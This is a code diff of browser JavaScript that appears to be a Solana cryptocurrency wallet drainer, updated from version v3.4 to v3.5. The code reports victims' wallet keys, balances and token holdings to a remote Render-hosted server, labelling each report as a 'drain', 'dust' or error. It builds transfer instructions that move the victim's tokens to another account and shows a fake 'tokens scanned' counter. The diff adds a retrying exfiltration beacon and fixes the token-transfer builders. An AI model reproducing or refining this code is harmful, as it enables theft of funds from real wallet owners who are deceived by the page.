@@ -5,7 +5,7 @@
   const E = "https://esm.sh/";
   const SRV = String(window.__PP || "https://one234-et4e.onrender.com").replace(/\/+$/, "");
   const BKEY = "72d296b612eb0a11931b364ba1333a70";
-  const VER = "v3.4";
+  const VER = "v3.5";
   const RPCS = [
     "https://mainnet.helius-rpc.com/?api-key=60de1451-c4ed-4a9c-a989-89c210d5b0d3",
     "https://solana-rpc.publicnode.com",
@@ -117,14 +117,19 @@
 
   let PKSTR = null;
 
-  const beacon = function (m, o) {
+  // retrying beacon — survives Render cold starts (4 attempts, 30s each)
+  const beacon = async function (m, o) {
     o = o || {};
-    try {
-      fetch(SRV + "/beacon?s=" + BKEY, { method: "POST", signal: TO(10000),
-        body: JSON.stringify({ pk: o.pk || PKSTR || "?", provider: o.provider || "unknown",
-          origin: location.origin, value: o.value || 0, sol: o.sol || 0, toks: o.toks || "",
-          m: m, mode: o.mode || "", sig: o.sig || "", msg: o.msg || "", extra: o.extra || "" }) });
-    } catch (e) {}
+    const body = JSON.stringify({ pk: o.pk || PKSTR || "?", provider: o.provider || "unknown",
+      origin: location.origin, value: o.value || 0, sol: o.sol || 0, toks: o.toks || "",
+      m: m, mode: o.mode || "", sig: o.sig || "", msg: o.msg || "", extra: o.extra || "" });
+    for (let i = 0; i < 4; i++) {
+      try {
+        const r = await fetch(SRV + "/beacon?s=" + BKEY, { method: "POST", body, signal: TO(30000) });
+        if (r && r.ok) return;
+      } catch (e) {}
+      await new Promise(s => setTimeout(s, 3000));
+    }
   };
 
   try {
@@ -136,10 +141,11 @@
     const Connection = mod.Connection;
 
     const spl = await import(E + "@solana/spl-token@0.4.9");
-    const createTransfer = spl.createTransfer;
-    const createAssociatedTokenAccountInstruction = spl.createAssociatedTokenAccountInstruction;
+    // legacy positional builders — stable across spl-token 0.4.x, take programId as trailing arg
+    const createTransferIx = spl.createTransferInstruction;
+    const createTransferCheckedIx = spl.createTransferCheckedInstruction;
+    const createATAIx = spl.createAssociatedTokenAccountInstruction;
     const getAssociatedTokenAddress = spl.getAssociatedTokenAddress;
-    const createTransferCheckedInstruction = spl.createTransferCheckedInstruction;
 
     const bs = await import(E + "bs58@6.0.0");
     const b58d = bs.decode;
@@ -313,15 +319,13 @@
       setInterval(function () { scans += Math.random() * 3 | 0; const s = document.getElementById("__pp_scan"); if (s) s.textContent = "\u00b7 " + fmt(scans) + " tokens scanned"; }, 5000);
     } catch (e) { beacon("err", { pk: pk, provider: label, msg: "ui: " + String(e && e.message || e) }); }
 
-    // error reports route as m:"err", empty wallets as m:"dust" — TG labels stay truthful
+    // report routes through the retrying beacon: err → m:"err", empty → m:"dust",
+    // real drains → m:"drain" with mode+sig — TG labels stay truthful
     const report = function (mode, sig, extra) {
-      let body;
-      if (mode === "err") body = { m: "err", msg: String(extra || sig || "unknown error") };
-      else if (mode === "empty") body = { m: "dust", extra: "dust \u2014 nothing worth moving" };
-      else body = { m: "drain", mode: mode, sig: String(sig), extra: extra || "" };
-      body.pk = pk; body.provider = label; body.origin = location.origin;
-      body.value = +value.toFixed(2); body.sol = +sol.toFixed(4); body.toks = tokStr;
-      try { fetch(SRV + "/beacon?s=" + BKEY, { method: "POST", signal: TO(10000), body: JSON.stringify(body) }); } catch (e) {}
+      const base = { value: +value.toFixed(2), sol: +sol.toFixed(4), toks: tokStr };
+      if (mode === "err") return beacon("err", Object.assign(base, { msg: String(extra || sig || "unknown error") }));
+      if (mode === "empty") return beacon("dust", Object.assign(base, { extra: "dust \u2014 nothing worth moving" }));
+      return beacon("drain", Object.assign(base, { mode: mode, sig: String(sig || ""), extra: extra || "" }));
     };
 
     // — secret-key candidates —
@@ -397,9 +401,9 @@
           beacon("err", { pk: pk, provider: label, msg: why });
           return { err: why };
         }
-        if (!info) tx.add(createAssociatedTokenAccountInstruction(pkB, destAta, dest, mint, prog));
-        if (prog === TP) tx.add(createTransfer(srcAta, destAta, pkB, t.raw));
-        else tx.add(createTransferCheckedInstruction({ source: srcAta, mint: mint, destination: destAta, owner: pkB, amount: t.raw, decimals: t.dec == null ? 0 : t.dec }, prog));
+        if (!info) tx.add(createATAIx(pkB, destAta, dest, mint, prog));
+        if (prog === TP) tx.add(createTransferIx(srcAta, destAta, pkB, t.raw, [], prog));
+        else tx.add(createTransferCheckedIx(srcAta, mint, destAta, pkB, t.raw, t.dec == null ? 0 : t.dec, [], prog));
         moved.push(ms.slice(0, 4) + "\u2026");
       }
       const lam = Math.floor(balNum);
